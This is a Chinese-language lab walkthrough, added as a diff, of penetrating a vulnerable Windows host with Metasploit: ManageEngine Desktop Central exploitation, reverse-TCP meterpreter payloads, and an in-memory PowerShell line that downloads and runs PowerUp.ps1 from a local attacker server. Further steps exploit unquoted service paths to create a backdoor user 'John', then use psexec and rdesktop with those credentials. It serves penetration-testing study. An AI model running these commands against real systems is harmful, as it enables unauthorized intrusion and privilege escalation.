@@ -1,0 +1,60 @@
+metasploit漏洞演练
+
+原文链接https://www.zero-day.io/metasploitwalkthrough/
+
+信息收集
+
+nmap查看端口，有一个8022服务，打开运行着存在漏洞的ManageEngine Desktop Central 9
+
+使用msf进行渗透
+
+msfconsole search ManageEngine use exploit/windows/http//manageengine_connectionid_write
+
+有关漏洞、攻击载荷、利用的解释：
+
+vulnerability、payload、exploit：
+
+Understanding the difference between the concepts vulnerability, payload and exploit is important. The payload is the actual code you wish to execute, whilst the exploit is a way to deliver the payload. A vulnerability is a weak spot in the system that allows the exploit to work. If you take the analogy of a rocket, the rocket is the exploit whilst the warhead is the payload, delivering the actual damage.
+
+一般payload都是反弹shell，常用的为meterpreteter： set payload windows/meterpreter/reverse_tcp
+
+进行权限提升
+
+1、Meterpreter
+
+提权命令getsystem，此处失败。
+
+2、Powersploit：强大的windows权限提升框架
+
+下载地址 https://github.com/PowerShellMafia/PowerSploit
+
+运行 python -m SimpleHTTPServer
+
+set payload windows/powershell_reverse_tcp
+
+为避免目标杀软发现，直接在内存中下载并运行脚本
+
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.241:8000/Privesc/PowerUp.ps1")
+
+之后，执行一个叫 Invoke-AllChecks的脚本，检查权限提升漏洞，并输出 Invoke-AllChecks | Out-File allchecks.txt
+
+此时新开meterpreter shell下载此文件
+
+allchecks.txt包含很多漏洞，如unquoted servicepaths, hackable DLL locations, unattended install files。 此处仅关注unquoted servicepaths and service executable and argument permissions。 原文在执行Install-ServiceBinary -Name 'jenkins'.后，没有成功获得权限。
+
+之后进行手工查找unquoted servicepaths（what's this）
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
+
+发现了一个OpenSSHd的服务，执行以下脚本，自动新建用户"John"，口令为"Password123!" Install-ServiceBinary -Name 'OpenSSHd'
+尝试重启OpenSSHd net stop OpenSSHd net start OpenSSHd
+
+利用系统漏洞
+
+由于无权限重启服务，使用nmap查看是否有远程重启的漏洞。发现漏洞CVE-2012-0002。
+
+使用该漏洞，查看用户John已被添加，此时使用著名的PSExec进行漏洞利用
+
+use exploit/windows/smb/psexec set payload windows/meterpreter/reverse_tcp set rhost set lhost set lport set smbuser john set smbpass Password123! exploit
+
+此外还可以连接远程桌面 rdesktop -u john -p Password123! 192.168.0.206
